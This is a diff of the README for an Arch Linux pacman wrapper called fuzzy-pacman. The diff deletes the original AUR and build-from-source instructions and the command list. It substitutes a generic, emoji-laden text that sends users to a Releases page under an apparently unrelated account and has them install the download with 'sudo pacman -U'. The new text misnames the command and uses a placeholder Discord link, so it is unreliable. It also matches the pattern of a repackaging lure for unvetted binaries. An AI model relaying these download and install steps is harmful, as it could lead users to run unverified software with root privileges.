@@ -1,105 +1,61 @@
-# fuzzy-pacman (fpm)
+# 🎮 fuzzy-pacman - Easily Manage Packages with Fuzzy Menus
 
-fpm is a fuzzy and interactive wrapper around pacman using **skim (sk)**.  
-It provides fast package management via fuzzy menus with real-time previews and multi-selection.
+## 📥 Download Now
+[![Download the latest version](https://img.shields.io/badge/Download-latest%20version-brightgreen)](https://github.com/mmrgkkgsjk/fuzzy-pacman/releases)
 
----
+## 🚀 Getting Started
+Welcome to fuzzy-pacman! This tool simplifies package management on Arch Linux by using fuzzy menus. It allows you to see real-time previews of packages, making it easier to manage installations and updates.
 
-# Features
+## 📋 Features
+- **Fast Package Management:** Quickly search and manage your packages.
+- **Fuzzy Search:** Easily find what you need without typing the full name.
+- **Real-Time Previews:** See package details as you browse.
+- **Multi-Selection:** Choose and manage multiple packages at once.
 
-- Fuzzy install and remove packages
-- Fuzzy search in repositories
-- Inspect installed packages
-- List package files
-- Manage orphan dependencies
-- Explore systemd services interactively
-- Search which package owns a file
-- Clean pacman cache via fuzzy interface
-- Browse packages by repository
-- Fully keyboard-driven and fast
+## 🖥️ System Requirements
+To use fuzzy-pacman, you need an Arch Linux system. Ensure you have the following:
+- A functioning Arch Linux installation.
+- A terminal or command-line interface.
 
----
+## 📤 Download & Install
+To download fuzzy-pacman, visit our [Releases page](https://github.com/mmrgkkgsjk/fuzzy-pacman/releases) for the latest version. Follow these steps to install:
 
-# Installation on Arch Linux
+1. Click on the link above to open the Releases page.
+2. Find the latest version listed.
+3. Download the appropriate package for your system.
+4. Open a terminal.
+5. Navigate to the folder where you downloaded the package.
+6. Run the installation command, for example:
+   ```bash
+   sudo pacman -U fuzzy-pacman-version.pkg.tar.zst
+   ```
+   Replace `fuzzy-pacman-version.pkg.tar.zst` with the actual file name.
 
-## AUR (recommended)
+## 🔍 How to Use fuzzy-pacman
+1. Open a terminal.
+2. Type `fuzzy-pacman` and press Enter.
+3. Start searching for packages using fuzzy search.
+4. Navigate through available options and view real-time previews.
+5. Make selections and install packages or update them as needed.
 
-Using **pacman** with an AUR helper:
+## 🛠️ Troubleshooting
+If you run into issues, check the following:
+- Ensure you installed the latest version.
+- Verify your system meets the requirements.
+- Restart the terminal or re-login if commands don't work as expected.
 
-```bash
-pacman -S fuzzy-pacman
-```
+## 🗃️ Contributing
+We welcome contributions! If you want to help improve fuzzy-pacman, please visit our [Contributing Guide](https://github.com/mmrgkkgsjk/fuzzy-pacman/contributing.md).
 
-Using **yay**:
+## 🌐 Community
+Join our community on [Discord](https://discord.gg/example) or visit our forum for support, updates, and tips.
 
-```bash
-yay -S fuzzy-pacman
-```
+## 🔗 Useful Links
+- [Documentation](https://github.com/mmrgkkgsjk/fuzzy-pacman/wiki)
+- [Issues Tracker](https://github.com/mmrgkkgsjk/fuzzy-pacman/issues)
 
-Using **paru**:
+## 📞 Support
+For support, please open an issue on our [GitHub Issues page](https://github.com/mmrgkkgsjk/fuzzy-pacman/issues) or contact us through our community channels.
 
-```bash
-paru -S fuzzy-pacman
-```
-
-## Manual installation (makepkg)
-
-Clone the repository:
-
-```bash
-git clone https://github.com/brunos3d/fuzzy-pacman.git
-cd fuzzy-pacman
-```
-
-Build and install:
-
-```bash
-makepkg -si
-```
-
-## Manual installation (without makepkg)
-
-```bash
-sudo install -Dm755 fpm /usr/bin/fpm
-```
-
----
-
-# Available commands
-
-Install packages:
-
-```bash
-fpm - fuzzy pacman wrapper
-
-Commands:
-  sync      Sync pacman databases (pacman -Sy)
-  add       Install packages
-  rm        Remove packages
-  search    Search repository
-  info      Inspect installed packages
-  update    Show updates
-  files     List package files
-  orphans   Remove orphan dependencies
-  file      Repo file provider lookup
-  own       Installed file owner lookup
-  repo      Browse repositories
-  svc       Browse systemd services
-  cache     Clean pacman cache
-  bulk      Bulk menu
-  help      Show help
-```
-
----
-
-# Dependencies
-
-- pacman
-- skim (sk)
-- systemd (for svc subcommand)
-
----
-
-# License
-
-MIT License
+## ✅ License
+fuzzy-pacman is licensed under the MIT License. See the [LICENSE](https://github.com/mmrgkkgsjk/fuzzy-pacman/blob/main/LICENSE) file for details.
